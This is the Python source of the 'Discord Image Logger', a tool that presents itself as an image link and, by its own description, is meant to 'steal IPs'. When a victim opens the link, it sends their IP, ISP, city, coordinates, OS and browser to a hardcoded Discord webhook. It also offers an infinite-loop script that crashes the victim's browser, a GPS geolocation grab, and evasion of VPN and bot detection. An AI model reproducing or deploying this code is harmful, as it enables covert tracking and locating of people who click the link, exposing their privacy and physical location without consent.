# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1351889043348127804/6rkpJOaDx53V9ch5E79ih5GeLcbi2ssCgT6wneHYQdB9TuH7c0bEaPFdnOJlTIK9-_v4",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
